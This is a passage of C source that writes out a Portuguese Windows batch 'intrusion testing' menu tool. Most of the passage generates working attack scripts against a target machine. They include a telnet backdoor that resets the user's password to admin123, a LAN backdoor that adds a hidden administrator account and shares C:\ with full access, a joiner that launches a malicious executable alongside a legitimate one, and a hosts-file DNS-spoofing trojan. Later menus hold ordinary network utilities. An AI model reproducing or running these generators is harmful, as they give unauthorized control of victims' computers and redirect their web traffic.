	fprintf(arqWin,"echo   e mudar a senha de usuario do sistema para \"admin123\".					\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"echo   Como utilizar: tendo sido executado o backdoor na maquina alvo, voce			\n");
	fprintf(arqWin,"echo   tera que conectar-se a ela atraves do telnet, apos isso sera				\n");
	fprintf(arqWin,"echo   solicitado a senha de usuario (que vai ser admin123).					\n");
	fprintf(arqWin,"echo.												\n");
	fprintf(arqWin,"echo   Condicoes para uso:									\n");
	fprintf(arqWin,"echo   ^|											\n");		
	fprintf(arqWin,"echo   +-^> 1 - O backdoor ter sido executado na maquina alvo;					\n");
	fprintf(arqWin,"echo   ^|											\n");
	fprintf(arqWin,"echo   +-^> 2 - Voce ter o ip da maquina alvo;							\n");
	fprintf(arqWin,"echo   ^|											\n");
	fprintf(arqWin,"echo   +-^> 3 - A maquina alvo estar online;							\n");
	fprintf(arqWin,"echo   ^|											\n");
	fprintf(arqWin,"echo   +-^> 4 - Conectar-se a maquina alvo atraves do telnet.					\n");
	fprintf(arqWin,"echo.												\n");

	fprintf(arqWin,"choice /C SN /M:\"Gerar backdoor agora\"							\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :backdoorx								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :intruso								\n"); //l1493


	fprintf(arqWin,":backdoorx												\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo. 												\n");            
	fprintf(arqWin,"echo       _______________                _______________					        \n");
	fprintf(arqWin,"echo      ^|  ___________  ^|            ^|  ___________  ^|						\n");
	fprintf(arqWin,"echo      ^| ^|   \\ /    ^| ^|          ^| ^|   /  \\   ^| ^|						\n");
	fprintf(arqWin,"echo      ^| ^|   0   0   ^| ^|          ^| ^|   0 - 0   ^| ^|						\n");
	fprintf(arqWin,"echo      ^| ^|     -     ^| ^| Backdoor ^| ^|    ___    ^| ^|						\n");
	fprintf(arqWin,"echo      ^| ^|  \\___/   ^| ^|          ^| ^|   (___)   ^| ^|						\n");
	fprintf(arqWin,"echo      ^| ^|___     ___^| ^|  Conex∆o ^| ^|___________^| ^|						\n");
	fprintf(arqWin,"echo      ^|_____^|\\_/^|_____^|  direta ^|_______________^|					        \n");	
	fprintf(arqWin,"echo        _^|__^|/\\^|_^|_................_^|________^|_						\n");
	fprintf(arqWin,"echo       / **********\\              / **********\\							\n");
	fprintf(arqWin,"echo     /  ************ \\          /  ************ \\							\n");
	fprintf(arqWin,"echo    --------------------        --------------------						\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"IF EXIST Teste_de_intrusao-Backdoor.bat GOTO :backdoorz							\n");
	fprintf(arqWin,"IF NOT EXIST Teste_de_intrusao-Backdoor.bat GOTO :backdoory						\n");
	fprintf(arqWin,":backdoory												\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo @echo off >> Teste_de_intrusao-Backdoor.bat							\n");
	fprintf(arqWin,"echo sc config TlntSvr start= auto >> Teste_de_intrusao-Backdoor.bat					\n");
	fprintf(arqWin,"echo net user %%%%USERNAME%%%% admin123 >> Teste_de_intrusao-Backdoor.bat				\n");
	fprintf(arqWin,"echo net start telnet >> Teste_de_intrusao-Backdoor.bat							\n");
	fprintf(arqWin,"echo exit >> Teste_de_intrusao-Backdoor.bat								\n");
	fprintf(arqWin,"echo   \"Teste_de_intrusao-Backdoor.bat\" gerado com sucesso!						\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"pause													\n");
	fprintf(arqWin,"goto :D													\n");

	fprintf(arqWin,":backdoorz												\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   N∆o sera poss°vel gerar o backdoor!								\n");
	fprintf(arqWin,"echo   \"Teste_de_intrusao-Backdoor.bat\" ja existe no diretorio atual!					\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"pause													\n");
	fprintf(arqWin,"goto :D													\n");

	fprintf(arqWin,":6D													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Backdoor de Rede LAN										\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Atencao! Cuidado para nao executar em seu pr¢prio PC o script gerado!				\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Acao do Backdoor: vai habilitar o servico de compartilhamento de arquivos			\n");
	fprintf(arqWin,"echo   em rede na maquina alvo. So funciona em maquinas da sua rede LAN!				\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Como utilizar: tendo sido executado o backdoor na maquina alvo, voce				\n");
	fprintf(arqWin,"echo   tera que conectar-se a ela atraves do servico de compartilhamento de				\n");
	fprintf(arqWin,"echo   arquivos do Windows (vai estar dispon°vel na janela \"Computador\").				\n");
	fprintf(arqWin,"echo   Devera clicar no °cone do compartilhamento e efetuar login e senha.				\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Condicoes para uso:										\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 1 - O backdoor ter sido executado na maquina alvo;						\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 2 - A maquina alvo estar online;								\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 3 - Conectar-se a maquina alvo atraves do compartilhamento 					\n");
	fprintf(arqWin,"echo            de arquivos.										\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M:\"Gerar backdoor agora\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :backdoorlan									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :intruso									\n");

	fprintf(arqWin,":backdoorlan												\n");
	fprintf(arqWin,"IF EXIST Teste_de_intrusao-Backdoor_LAN.bat GOTO :backdoorlan0						\n");
	fprintf(arqWin,"IF NOT EXIST Teste_de_intrusao-Backdoor_LAN.bat GOTO :backdoorlan2					\n");
	fprintf(arqWin,":backdoorlan2												\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"set /p login1x=Digite um login:										\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"set /p senha1x=Digite uma senha:									\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"set /p share1x=Digite um nome de compartilhamento:							\n");
	fprintf(arqWin,"echo. 												     \n");            
	fprintf(arqWin,"echo       _______________                _______________						\n");
	fprintf(arqWin,"echo      ^|  ___________  ^|            ^|  ___________  ^|						\n");
	fprintf(arqWin,"echo      ^| ^|   \\ /    ^| ^|          ^| ^|   /  \\   ^| ^|						\n");
	fprintf(arqWin,"echo      ^| ^|   0   0   ^| ^|          ^| ^|   0 - 0   ^| ^|						\n");
	fprintf(arqWin,"echo      ^| ^|     -     ^| ^| Backdoor ^| ^|    ___    ^| ^|						\n");
	fprintf(arqWin,"echo      ^| ^|  \\___/   ^| ^|    de    ^| ^|   (___)   ^| ^|						\n");
	fprintf(arqWin,"echo      ^| ^|___     ___^| ^| Rede LAN ^| ^|___________^| ^|						\n");
	fprintf(arqWin,"echo      ^|_____^|\\_/^|_____^|         ^|_______________^|						\n");
	fprintf(arqWin,"echo        _^|__^|/\\^|_^|_................_^|________^|_						\n");
	fprintf(arqWin,"echo       / **********\\              / **********\\							\n");
	fprintf(arqWin,"echo     /  ************ \\          /  ************ \\							\n");
	fprintf(arqWin,"echo    --------------------        --------------------						\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo @echo off >> Teste_de_intrusao-Backdoor_LAN.bat							\n");
	fprintf(arqWin,"echo net user %%login1x%% %%senha1x%% /add >> Teste_de_intrusao-Backdoor_LAN.bat 			\n");
	fprintf(arqWin,"echo net localgroup Administradores %%login1x%% /add >> Teste_de_intrusao-Backdoor_LAN.bat		\n");
	fprintf(arqWin,"echo net share %%share1x%%=C:\\ /GRANT:todos,full >> Teste_de_intrusao-Backdoor_LAN.bat			\n");
	fprintf(arqWin,"echo exit >> Teste_de_intrusao-Backdoor_LAN.bat								\n");
	fprintf(arqWin,"echo   \"Teste_de_intrusao-Backdoor_LAN.bat\" gerado com sucesso!					\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"pause													\n");
	fprintf(arqWin,"goto :D													\n");//l1596


	fprintf(arqWin,":backdoorlan0												\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Nao sera poss°vel gerar o backdoor!								\n");
	fprintf(arqWin,"echo   \"Teste_de_intrusao-Backdoor_LAN.bat\" ja existe no diretorio atual!				\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"pause													\n");
	fprintf(arqWin,"goto :D													\n");

	fprintf(arqWin,":7D													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Badcom Starter (joiner)										\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Atencao! Cuidado para n∆o executar em seu pr¢prio PC o script gerado!				\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Script em bat que iniciara outros 2 arquivos (executaveis):					\n");
	fprintf(arqWin,"echo   Arquivo 1 - arquivo legitimo									\n");
	fprintf(arqWin,"echo   Arquivo 2 - arquivo malicioso									\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"set /p idx01=Digite o nome do arquivo 1 (.exe):								\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"set /p idx02=Digite o nome do arquivo 2 (.exe):								\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M \"Gerar Badcom Starter\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :badstart									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :bypass10									\n");

	fprintf(arqWin,":badstart												\n");
	fprintf(arqWin,"IF EXIST starter.bat GOTO :badstart0									\n");
	fprintf(arqWin,"IF NOT EXIST starter.bat GOTO :badstart2								\n");
	fprintf(arqWin,":badstart2												\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo @echo off >> starter.bat										\n");
	fprintf(arqWin,"echo start %%idx01%% >> starter.bat									\n");
	fprintf(arqWin,"echo start %%idx02%% >> starter.bat									\n");
	fprintf(arqWin,"echo exit >> starter.bat										\n");
	fprintf(arqWin,"echo   \"starter.bat\" gerado com sucesso!								\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"pause													\n");
	fprintf(arqWin,"goto :D													\n");

	fprintf(arqWin,":badstart0												\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   N∆o sera poss°vel gerar o badcom!								\n");
	fprintf(arqWin,"echo   \"starter.bat\" ja existe no diret¢rio atual!							\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"pause													\n");
	fprintf(arqWin,"goto :D													\n");

	fprintf(arqWin,":8D													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Trojan de DNS Spoofing										\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Atencao! Cuidado para nao executar em seu pr¢prio PC o script gerado!				\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Acao do trojan: ap¢s de ser executado na maquina alvo, fara alteracoes 				\n");
	fprintf(arqWin,"echo   no arquivo hosts do Windows, redirecionando o acesso aos sites que voce				\n");
	fprintf(arqWin,"echo   determinou para ip's de outros dom°nios de sua escolha.						\n");
	fprintf(arqWin,"echo   Limitei a criacao de redirecionamentos para 2 no maximo.						\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Depois do pentest, lembre-se de desfazer manualmente as alteracoes				\n");
	fprintf(arqWin,"echo   no arquivo host da maquina alvo!									\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M \"Iniciar processo de criacao\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :gotrojan									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :intruso									\n");//l1667


	fprintf(arqWin,":gotrojan												\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"set /p redirect1A=Digite um dom°nio (URL):								\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"set /p redirect1B=Digite um IP:										\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   1 - Acrescentar outro redirecionamento								\n");
	fprintf(arqWin,"echo   2 - Gerar Trojan agora										\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C 12 /M \"Escolha uma das opcoes\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :gotrojan2									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :7Dnow1									\n");

	fprintf(arqWin,":gotrojan2												\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"set /p redirect2A=Digite um dom°nio (URL):								\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"set /p redirect2B=Digite um IP:										\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M \"Gerar Trojan agora\"									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :7Dnow2									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :D										\n");

	fprintf(arqWin,":7Dnow1													\n");
	fprintf(arqWin,"IF EXIST Teste_de_intrusao-DNS_Spoof.bat GOTO :aviso0							\n");
	fprintf(arqWin,"IF NOT EXIST Teste_de_intrusao-DNS_Spoof.bat GOTO :7Dnow1x						\n");
	fprintf(arqWin,":7Dnow1x												\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.             											\n");
	fprintf(arqWin,"echo          !\\_______________________/!\\								\n");
	fprintf(arqWin,"echo          !!                         !! \\								\n");
	fprintf(arqWin,"echo          !!    Loading Trojan...    !!  \\								\n");
	fprintf(arqWin,"echo          !!                         !!  !								\n");
	fprintf(arqWin,"echo          !!       _^|                !!  !								\n");
	fprintf(arqWin,"echo          !!      (_\\_____/         !!  !								\n");
	fprintf(arqWin,"echo          !!        \\_____^|         !!  !								\n");
	fprintf(arqWin,"echo          !!        _(     )_        !!  !  							\n");         
	fprintf(arqWin,"echo          !!       \\_______/        !!  /								\n");
	fprintf(arqWin,"echo          !!_________________________!! /								\n");
	fprintf(arqWin,"echo          !/________________________\\!/								\n");
	fprintf(arqWin,"echo             _\\_________________/__/!_								\n");
	fprintf(arqWin,"echo           !_______________________!/								\n");
	fprintf(arqWin,"echo          ________________________									\n");
	fprintf(arqWin,"echo         /oooo  oooo  oooo  oooo /!									\n");
	fprintf(arqWin,"echo        /ooooooooooooooooooooooo/ /									\n");
	fprintf(arqWin,"echo       /ooooooooooooooooooooooo/ /									\n");
	fprintf(arqWin,"echo      /C=_____________________/_/									\n");
	fprintf(arqWin,"echo @echo off >> Teste_de_intrusao-DNS_Spoof.bat							\n");
	fprintf(arqWin,"echo echo. >> Teste_de_intrusao-DNS_Spoof.bat								\n");
	fprintf(arqWin,"echo cd ^\\ >> Teste_de_intrusao-DNS_Spoof.bat								\n");
	fprintf(arqWin,"echo attrib hosts ^/s >> Teste_de_intrusao-DNS_Spoof.bat						\n");
	fprintf(arqWin,"echo cd windows^\\System32^\\drivers^\\etc >> Teste_de_intrusao-DNS_Spoof.bat				\n");
	fprintf(arqWin,"echo ren hosts hosts.txt >> Teste_de_intrusao-DNS_Spoof.bat						\n");
	fprintf(arqWin,"echo echo %%redirect1B%% %%redirect1A%% ^> hosts.txt >> Teste_de_intrusao-DNS_Spoof.bat			\n");
	fprintf(arqWin,"echo ren hosts.txt hosts >> Teste_de_intrusao-DNS_Spoof.bat						\n");
	fprintf(arqWin,"echo exit >> Teste_de_intrusao-DNS_Spoof.bat								\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   \"Teste_de_intrusao-DNS_Spoof.bat\" gerado com sucesso!						\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"pause													\n");
	fprintf(arqWin,"goto :D													\n");

	fprintf(arqWin,":7Dnow2													\n");
	fprintf(arqWin,"IF EXIST Teste_de_intrusao-DNS_Spoof.bat GOTO :aviso0							\n");
	fprintf(arqWin,"IF NOT EXIST Teste_de_intrusao-DNS_Spoof.bat GOTO :7Dnow2x						\n");
	fprintf(arqWin,":7Dnow2x												\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.  												       \n");           
	fprintf(arqWin,"echo          !\\________________________/!\\								\n");
	fprintf(arqWin,"echo          !!                         !! \\								\n");
	fprintf(arqWin,"echo          !!    Loading Trojan...    !!  \\								\n");
	fprintf(arqWin,"echo          !!                         !!  !								\n");
	fprintf(arqWin,"echo          !!       _^|                !!  !								\n");
	fprintf(arqWin,"echo          !!      (_\\_____/         !!  !								\n");
	fprintf(arqWin,"echo          !!        \\_____^|         !!  !								\n");
	fprintf(arqWin,"echo          !!        _(     )_        !!  !  							\n");         
	fprintf(arqWin,"echo          !!       \\_______/        !!  /								\n");
	fprintf(arqWin,"echo          !!_________________________!! /								\n");
	fprintf(arqWin,"echo          !/________________________\\!/								\n");
	fprintf(arqWin,"echo            __\\_________________/__/!_								\n");
	fprintf(arqWin,"echo           !_______________________!/								\n");
	fprintf(arqWin,"echo          ________________________									\n");	
	fprintf(arqWin,"echo         /oooo  oooo  oooo  oooo /!									\n");
	fprintf(arqWin,"echo        /ooooooooooooooooooooooo/ /									\n");
	fprintf(arqWin,"echo       /ooooooooooooooooooooooo/ /									\n");
	fprintf(arqWin,"echo      /C=_____________________/_/									\n");
	fprintf(arqWin,"echo @echo off >> Teste_de_intrusao-DNS_Spoof.bat							\n");
	fprintf(arqWin,"echo echo. >> Teste_de_intrusao-DNS_Spoof.bat								\n");
	fprintf(arqWin,"echo cd ^\\ >> Teste_de_intrusao-DNS_Spoof.bat								\n");
	fprintf(arqWin,"echo attrib hosts ^/s >> Teste_de_intrusao-DNS_Spoof.bat						\n");
	fprintf(arqWin,"echo cd windows^\\System32^\\drivers^\\etc >> Teste_de_intrusao-DNS_Spoof.bat				\n");
	fprintf(arqWin,"echo ren hosts hosts.txt >> Teste_de_intrusao-DNS_Spoof.bat						\n");
	fprintf(arqWin,"echo echo %%redirect1B%% %%redirect1A%% ^> hosts.txt >> Teste_de_intrusao-DNS_Spoof.bat			\n");
	fprintf(arqWin,"echo echo %%redirect2B%% %%redirect2A%% ^> hosts.txt >> Teste_de_intrusao-DNS_Spoof.bat			\n");
	fprintf(arqWin,"echo ren hosts.txt hosts >> Teste_de_intrusao-DNS_Spoof.bat						\n");
	fprintf(arqWin,"echo exit >> Teste_de_intrusao-DNS_Spoof.bat								\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   \"Teste_de_intrusao-DNS_Spoof.bat\" gerado com sucesso!						\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"pause													\n");
	fprintf(arqWin,"goto :D													\n");//l1773


	fprintf(arqWin,":aviso0													\n");
	fprintf(arqWin,"echo.													\n");	
	fprintf(arqWin,"echo   N∆o sera poss°vel gerar o trojan!								\n");
	fprintf(arqWin,"echo   \"Teste_de_intrusao-DNS_Spoof.bat\" ja existe no diret¢rio atual!				\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"pause													\n");
	fprintf(arqWin,"goto :D													\n");

	fprintf(arqWin,":E 													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo * Clientes												\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 1 - FTP											\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 2 - Telnet											\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 3 - Conex∆o de Area de Trabalho Remota							\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 4 - Retornar ao menu principal								\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C 1234 /M \"Escolha uma das opcoes\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :ftp										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :tel										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :atr										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==4 goto :1x										\n");

	fprintf(arqWin,":ftp													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo    +-------------------------+									\n");
	fprintf(arqWin,"echo    ^|                         ^|									\n");
	fprintf(arqWin,"echo    ^| FTP em linha de comando ^|									\n");
	fprintf(arqWin,"echo    ^|                         ^|									\n");
	fprintf(arqWin,"echo    +-------------------------+									\n");
	fprintf(arqWin,"echo    ^|												\n");
	fprintf(arqWin,"echo    +-^> Para conectar, digite \"open ftp.exemplo.br\"						\n");
	fprintf(arqWin,"echo    ^|												\n");
	fprintf(arqWin,"echo    +-^>Para sair, digite \"quit\"									\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"ftp													\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :E										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit										\n");

	fprintf(arqWin,":tel													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo    +-------------------+										\n");
	fprintf(arqWin,"echo    ^|                   ^|										\n");
	fprintf(arqWin,"echo    ^| Cliente MS Telnet ^|										\n");
	fprintf(arqWin,"echo    ^|                   ^|										\n");
	fprintf(arqWin,"echo    +-------------------+										\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"SET /P IP=Digite o IP:											\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"SET /P P=Digite a porta:										\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"telnet %%IP%% %%P%%											\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :E										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit										\n");
	
	fprintf(arqWin,":atr													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");	
	fprintf(arqWin,"echo   +-----------------------------------------------+						\n");
	fprintf(arqWin,"echo   ^|                                               ^|						\n");
	fprintf(arqWin,"echo   ^| Servico de Conex∆o de Area de Trabalho Remota ^|						\n");
	fprintf(arqWin,"echo   ^|                                               ^|						\n");
	fprintf(arqWin,"echo   +-----------------------------------------------+						\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"mstsc													\n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :E										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit									      \n");//l1857


	fprintf(arqWin,":F													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo * Redes												\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 1 - Rede LAN										\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 2 - Rede Wi-fi										\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 3 - Retornar ao menu principal								\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C 123 /M:\"Escolha uma das opcoes\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :redelan									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :redewifi									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto 1x										\n");

	fprintf(arqWin,":redelan												\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo * Rede LAN												\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 1 - Listar os IP's da rede									\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 2 - Listar os compartilhamentos da rede							\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 3 - Retornar ao menu anterior								\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C 123 /M:\"Escolha uma das opcoes\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :iplist									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :sharelist									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :F										\n");

	fprintf(arqWin,":iplist													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"arp -a													\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :redelan									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit										\n");

	fprintf(arqWin,":sharelist												\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"net share												\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :redelan									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit										\n");

	fprintf(arqWin,":redewifi												\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo * Rede Wi-fi											\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 1 - Criar um Hotspot Wi-fi									\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 2 - Parar Hotspot Wi-fi									\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 3 - Conectar-se a uma rede Wi-fi								\n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 4 - Recuperar a senha da rede Wi-fi                                                         \n");
	fprintf(arqWin,"echo   ^|												\n");
	fprintf(arqWin,"echo   +-^> 5 - Retornar ao menu anterior                                                               \n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C 12345 /M:\"Escolha uma das opcoes\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :hotspotwf									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :stophotwifi									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==3 goto :wifi										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==4 goto :wifi2									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==5 goto :F										\n");

	fprintf(arqWin,":hotspotwf												\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Verificacao do dispositivo									\n");
	fprintf(arqWin,"netsh wlan show drivers											\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Verifique se aparece a mensagem \"Hosted network supported : Yes\"				\n");
	fprintf(arqWin,"echo                                ou \"Rede hospedada compatÌvel: Sim\"				\n");
	fprintf(arqWin,"echo   Se aparecer, seu computador tem suporte a hotspots, caso contrario,				\n");
	fprintf(arqWin,"echo   nao!												\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M:\"Prosseguir\"										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :gowifi									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :redewifi									\n");

	fprintf(arqWin,":gowifi													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"SET /P IDX=Digite um nome (SSID):									\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"SET /P KEYX=Digite um senha:										\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"netsh wlan set hostednetwork mode=allow ssid=%%IDX%% key=%%KEYX%%					\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Atencao! Seu hotspot esta offline no momento!							\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M:\"Iniciar hotspot agora\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :hotini									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :redewifi									\n");

	fprintf(arqWin,":hotini													\n");
	fprintf(arqWin,"netsh wlan start hostednetwork										\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Para parar o hotspot, basta acessar Redes - Rede Wi-fi - Parar Hotspot Wi-fi			\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :redewifi									\n");
